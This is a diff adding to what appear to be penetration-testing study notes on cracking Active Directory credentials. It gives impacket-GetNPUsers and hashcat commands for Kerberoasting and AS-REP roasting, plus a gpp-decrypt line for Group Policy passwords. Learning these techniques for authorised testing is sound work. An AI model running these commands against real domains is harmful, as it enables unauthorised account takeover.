@@ -51,6 +51,42 @@ hashcat -h | grep -i "ntlmv2"
 Group Policy XML files
 Crack XML cpassword string
 gpp-decrypt {HASH}
-  
+
+Kerberoast Rubeus Crack:
+TGS-REP Hash
+kali@kali:~$ hashcat --help | grep -i "Kerberos"         
+  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
+  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
+  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
+  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
+  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
+
+13100 is the correct mode to crack TGS-REP hashes.
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+AS-REP-Roast Crack:
+impacket-GetNPUsers -dc-ip 192.168.x.x  -request -outputfile hashes.asreproast corp.com/mute <-- Using GetNPUsers to perform AS-REP roasting remotely.
+
+Check correct mode for an AS-REP hash by grepping for "Kerberos" in hashcat help.
+
+kali@kali:~$ hashcat --help | grep -i "Kerberos"
+  19600 | Kerberos 5, etype 17, TGS-REP                       | Network Protocol
+  19800 | Kerberos 5, etype 17, Pre-Auth                      | Network Protocol
+  19700 | Kerberos 5, etype 18, TGS-REP                       | Network Protocol
+  19900 | Kerberos 5, etype 18, Pre-Auth                      | Network Protocol
+   7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth               | Network Protocol
+  13100 | Kerberos 5, etype 23, TGS-REP                       | Network Protocol
+  18200 | Kerberos 5, etype 23, AS-REP                        | Network Protocol
+
+The correct mode for AS-REP is 18200.
+kali@kali:~$ sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+
+
+
+
+
+
 
 
